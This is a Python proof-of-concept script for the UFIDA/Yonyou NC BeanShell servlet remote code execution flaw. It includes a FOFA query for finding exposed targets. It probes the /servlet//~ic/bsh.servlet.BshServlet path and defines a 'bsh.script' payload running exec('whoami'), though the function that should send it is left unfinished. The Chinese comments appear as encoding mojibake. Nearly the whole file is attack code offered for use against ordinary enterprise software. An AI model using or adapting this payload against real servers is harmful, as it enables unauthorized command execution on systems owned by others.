#!/usr/bin/python
#coding=GBK
from tamper import common
import sys
import os
import requests

sys.path.append(os.path.abspath(os.path.dirname(os.path.dirname(__file__))))
# def info():
#     '''
#         ����nc6.x poc
#     :return:
#     '''
#     print("-------------------------------------------------")
#     print("                     |")
#     print("author:ľ��                                      |")
#     print("�ýű���������֤©�����ڣ����������κ�Υ����;��          |")
#     print("FOFA:app='����-UFIDA-NC'                         |")
#     print("-------------------------------------------------")
#

def poc(url):
    url = url + "/servlet//~ic/bsh.servlet.BshServlet"
    proxys = {'http': 'http://127.0.0.1:8080', 'https': 'socks5://127.0.0.1:10808'}
    headers = {
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Mobile Safari/537.36',
    }
    resp = requests.get(url, verify=False, proxies=proxys, headers=headers)
    if "BeanShell Test Servlet" in resp.text:
        poc2(url)
    else:
        print(url+"©��������")

def poc2(url):
    #bsh.script=exec%28%22whoami%22%29
    post = {
        'bsh.script':'exec("whoami")',
    }



if __name__ == '__main__':
    common.info("test","test")
    common.main()
